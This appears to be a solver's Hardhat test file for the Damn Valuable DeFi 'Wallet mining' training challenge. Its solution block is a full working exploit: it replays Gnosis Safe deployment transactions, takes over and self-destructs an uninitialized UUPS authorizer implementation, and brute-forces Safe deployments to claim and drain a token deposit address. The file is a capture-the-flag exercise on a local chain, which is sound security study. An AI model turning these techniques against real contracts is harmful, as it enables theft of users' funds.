const { ethers, upgrades, tracer } = require('hardhat');
const { expect } = require('chai');
const Safe = require("@gnosis.pm/safe-contracts");
const DeployData = require("./deploy-data.json");

function setTracerTag(addr, name) {
    if (tracer)
        tracer.nameTags[addr] = name;
}

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;

    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;
    setTracerTag(DEPOSIT_ADDRESS, "Deposit Address");

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, ward, player] = await ethers.getSigners();
        setTracerTag(deployer.address, "Deployer");
        setTracerTag(ward.address, "Ward");
        setTracerTag(player.address, "Player");

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
            { kind: 'uups', initializer: 'init' }
        );
        setTracerTag(authorizer.address, "Authorizer (Proxy)");

        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);

        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        console.log("\n=== Exploit Begin ===\n");
        console.log("Deployer:", deployer.address);
        console.log("Ward:", ward.address);
        console.log("Player:", player.address);

        token = token.connect(player);
        authorizer = authorizer.connect(player);
        walletDeployer = walletDeployer.connect(player);

        // VULNERABILITY:
        // 0x9b6fb606a9f5789444c17768c6dfcf2f83563801 is not deployed on by anyone on local net, so
        // we can be the first deployer to own the tokens. This is actually a real attack incident
        // on Gnosis Safe & Wintermute on Optimism, which resulted in 20 million OP loss.
        // https://twitter.com/rstormsf/status/1534977598505115648

        // STEP 1:
        // We have to deploy Gnosis Safe contracts on the local network. Thankfully, without EIP-155
        // enabled at the deployment time, we can replay the deployment txs of Gnosis Safe contracts
        // of mainnet on local net, even without the original deployer's private key.

        // Gnosis Safe contracts on mainnet
        const MAINNET_DEPLOYER = ethers.utils.getAddress("0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A");
        const MASTER_COPY = ethers.utils.getAddress("0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F");
        const PROXY_FACTORY = ethers.utils.getAddress("0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B");

        // Nonces that ware used for deployment on mainnet
        // retrieved from: https://etherscan.io/tx/0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3
        const MASTER_COPY_DEPLOY_NONCE = 0;
        // retrieved from: https://etherscan.io/tx/0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261
        const PROXY_FACTORY_DEPLOY_NONCE = 2;

        expect(
            ethers.utils.getContractAddress({
                from: MAINNET_DEPLOYER,
                nonce: MASTER_COPY_DEPLOY_NONCE
            })
        ).to.eq(MASTER_COPY);
        expect(
            ethers.utils.getContractAddress({
                from: MAINNET_DEPLOYER,
                nonce: PROXY_FACTORY_DEPLOY_NONCE
            })
        ).to.eq(PROXY_FACTORY);

        // Raw tx data of the deployment on mainnet
        // retrieved from: https://etherscan.io/getRawTx?tx=0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3
        const MASTER_COPY_DEPLOY_TX = DeployData.MASTER_COPY_DEPLOY_TX;
        // retrieved from: https://etherscan.io/getRawTx?tx=0x31ae8a26075d0f18b81d3abe2ad8aeca8816c97aff87728f2b10af0241e9b3d4
        const MASTER_COPY_SET_IMPL_TX = DeployData.MASTER_COPY_SET_IMPL_TX;
        // retrieved from: https://etherscan.io/getRawTx?tx=0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261
        const PROXY_FACTORY_DEPLOY_TX = DeployData.PROXY_FACTORY_DEPLOY_TX;

        // Replay the deployment on local network (without deployer's private key)
        // provide some gas fee to the deployer
        await player.sendTransaction({
            to: MAINNET_DEPLOYER,
            value: ethers.utils.parseEther("1")
        });

        // replay the txs
        // nonce = 0: deploy master copy
        expect(MASTER_COPY_DEPLOY_NONCE).to.eq(0);
        expect(
            (
                await (await ethers.provider.sendTransaction(MASTER_COPY_DEPLOY_TX)).wait()
            ).contractAddress
        ).to.eq(MASTER_COPY);

        // nonce = 1: set logic contract of master copy
        await (await ethers.provider.sendTransaction(MASTER_COPY_SET_IMPL_TX)).wait();

        // nonce = 2: deploy proxy factory
        expect(PROXY_FACTORY_DEPLOY_NONCE).to.eq(2);
        expect(
            (
                await (await ethers.provider.sendTransaction(PROXY_FACTORY_DEPLOY_TX)).wait()
            ).contractAddress
        ).to.eq(PROXY_FACTORY);

        let masterCopy = (await ethers.getContractFactory("GnosisSafe", player)).attach(MASTER_COPY);
        let proxyFactory = (await ethers.getContractFactory("GnosisSafeProxyFactory", player)).attach(PROXY_FACTORY);

        // ---

        // STEP 2:
        // Tamper the authorizer so that we are authorized to receive reward when we create a wallet

        // VULNERABILITY:
        // The logic contract is not initialized, so we can initialize it and become the owner. Being
        // the owner, we can call upgradeToAndCall() to DELEGATECALL a self-destructing contract.
        // The vulnerability is recognized as UUPSUpgradeable vulnerability before OpenZeppelin v4.3.2.
        // Reference:
        // https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/security/advisories/GHSA-q4h9-46xg-m3x9
        // https://forum.openzeppelin.com/t/security-advisory-initialize-uups-implementation-contracts/15301
        // https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680
        let authorizerImpl = (
            await ethers.getContractFactory("AuthorizerUpgradeable", player)
        ).attach(
            await upgrades.erc1967.getImplementationAddress(authorizer.address)
        );

        // become the owner
        await authorizerImpl.init([], []);

        // upgrade & self-destroy
        let suicidal = await (await ethers.getContractFactory("Suicidal", player)).deploy();
        await authorizerImpl.upgradeToAndCall(
            suicidal.address,
            suicidal.interface.encodeFunctionData("destruct", [])
        );

        // After the authorizer is destroyed, authorization checks are always passed
        expect(await walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).to.eq(true);
        expect(await walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.eq(true);

        // ---

        // STEP 3:
        // Brute-force deploy Gnosis Safe wallets until we own the target address.
        // At the same time, receive the rewards for creating Safe wallets.
        let proxyAddr;
        for (let i = 0; i < 100; i++) {
            let rcpt = await (await walletDeployer.drop(
                masterCopy.interface.encodeFunctionData(
                    "setup",
                    [
                        [player.address], // owners
                        1, // threshold
                        ethers.constants.AddressZero, // to
                        [], // data
                        ethers.constants.AddressZero, // fallbackHandler
                        ethers.constants.AddressZero, // paymentToken
                        ethers.constants.AddressZero, // payment
                        ethers.constants.AddressZero, // payment receiver
                    ]
                )
            )).wait();

            proxyAddr = "0x" + rcpt.logs[0].data.substr(-40);
            setTracerTag(proxyAddr, "My Safe Wallet #" + i);
            if (proxyAddr == DEPOSIT_ADDRESS) {
                console.log("Good wallet: ", i, proxyAddr);
                break;
            }
        }
        let safe = (await ethers.getContractFactory("GnosisSafe", player)).attach(proxyAddr);

        // Execute function call on behalf of player's safe by generating a player's signature (EIP-712)
        let tx = Safe.buildContractCall(
            token,
            "approve",
            [player.address, DEPOSIT_TOKEN_AMOUNT],
            await safe.nonce()
        );

        let domain = { verifyingContract: safe.address };
        expect(ethers.utils._TypedDataEncoder.hashDomain(domain)).to.eq(await safe.domainSeparator());

        let sig = {
            signer: player.address,
            data: await player._signTypedData(domain, Safe.EIP712_SAFE_TX_TYPE, tx)
        };
        let r = sig.data.substring(0, 66);
        let s = "0x" + sig.data.substring(66, 130);
        let v = "0x" + sig.data.substring(130);

        let digest = ethers.utils._TypedDataEncoder.hash(domain, Safe.EIP712_SAFE_TX_TYPE, tx);
        let recoveredSigner = ethers.utils.recoverAddress(digest, {r, s, v});
        expect(recoveredSigner).to.eq(player.address);

        await (await Safe.executeTx(safe, tx, [sig], {gasLimit: 30000000})).wait();
        await (await token.transferFrom(safe.address, player.address, DEPOSIT_TOKEN_AMOUNT)).wait();

        console.log("\n=== Exploit End ===\n");
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');

        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT));
    });
});
